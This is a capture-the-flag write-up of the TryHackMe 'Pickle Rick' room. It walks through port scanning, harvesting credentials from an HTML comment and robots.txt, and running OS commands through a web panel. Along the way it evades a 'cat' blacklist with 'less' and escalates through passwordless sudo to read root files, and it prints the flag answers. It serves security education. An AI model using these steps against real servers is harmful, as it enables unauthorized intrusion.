# Pickle Rick — CTF Writeup

**Platform:** TryHackMe
**Challenge:** Pickle Rick!
**Author:** 0xb0rn3
**Target IP:** 10.49.178.139

---

## Objective

Rick has turned himself into a pickle and needs three secret ingredients to brew his reverse-potion. The goal is to exploit a web server and retrieve all three ingredients hidden across the filesystem.

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.49.178.139
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | open  | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | open  | HTTP    | Apache httpd 2.4.41 |

Attack surface: web server on port 80 (Apache 2.4.41 on Ubuntu 20.04).

---

## Web Enumeration

### Source Code Review — Username Discovery

Fetching the main page source revealed a developer note left in an HTML comment:

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

**Username found:** `R1ckRul3s`

### robots.txt — Password Discovery

```bash
curl http://10.49.178.139/robots.txt
```

```
Wubbalubbadubdub
```

**Password found:** `Wubbalubbadubdub`

### Login Portal

Navigating to `/login.php` revealed a portal login form. Logging in with the discovered credentials:

- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`

Successful login redirected to `/portal.php`, a **command execution panel**.

---

## Exploitation — Remote Code Execution

The portal at `/portal.php` accepts and executes OS commands server-side. The `cat` command was blacklisted, but `less` bypassed the filter.

### Confirming RCE

```
Command: whoami
Output:  www-data

Command: id
Output:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Ingredient 1 — Web Root

Listing the web root (`/var/www/html`):

```
Command: ls
Output:
  Sup3rS3cretPickl3Ingred.txt
  assets
  clue.txt
  denied.php
  index.html
  login.php
  portal.php
```

Reading the ingredient file (using `less` since `cat` is blocked):

```
Command: less Sup3rS3cretPickl3Ingred.txt
```

> **Ingredient 1:** `mr. meeseek hair`

`clue.txt` hinted to look around the filesystem for the other ingredients.

---

## Ingredient 2 — Rick's Home Directory

Listing `/home`:

```
Command: ls /home
Output:  rick  ubuntu
```

Listing `/home/rick`:

```
Command: ls /home/rick
Output:  second ingredients
```

Reading the file (filename contains a space, quoted accordingly):

```
Command: less "/home/rick/second ingredients"
```

> **Ingredient 2:** `1 jerry tear`

---

## Privilege Escalation — Sudo Check

Checking sudo privileges for `www-data`:

```
Command: sudo -l
Output:
  User www-data may run the following commands on ip-10-49-178-139:
      (ALL) NOPASSWD: ALL
```

`www-data` has unrestricted passwordless sudo across all commands — full root access.

---

## Ingredient 3 — Root Directory

Listing `/root` with sudo:

```
Command: sudo ls /root
Output:  3rd.txt  snap
```

Reading the final ingredient:

```
Command: sudo less /root/3rd.txt
```

> **Ingredient 3:** `fleeb juice`

---

## Flags Summary

| # | Location | Ingredient |
|---|----------|------------|
| 1 | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | `mr. meeseek hair` |
| 2 | `/home/rick/second ingredients` | `1 jerry tear` |
| 3 | `/root/3rd.txt` | `fleeb juice` |

---

## Attack Chain Summary

```
nmap scan
  └─► Port 80 open (Apache)
        └─► HTML source comment → Username: R1ckRul3s
        └─► /robots.txt         → Password: Wubbalubbadubdub
              └─► /login.php login → portal.php (RCE panel)
                    └─► ls /var/www/html     → Ingredient 1 (mr. meeseek hair)
                    └─► ls /home/rick        → Ingredient 2 (1 jerry tear)
                    └─► sudo -l (NOPASSWD)
                          └─► sudo ls /root  → Ingredient 3 (fleeb juice)
```

---

## Tools Used

- `nmap` — port and service enumeration
- `curl` — HTTP interaction, login, command execution
- `gobuster` / manual enumeration — directory discovery

---

## Key Takeaways

1. **Never leave credentials in HTML comments or publicly accessible files like robots.txt.**
2. **Command injection in web panels is critical severity** — always sanitize and restrict OS-level execution.
3. **www-data with NOPASSWD sudo ALL is a complete privilege escalation** — web application accounts should have minimal system privileges.
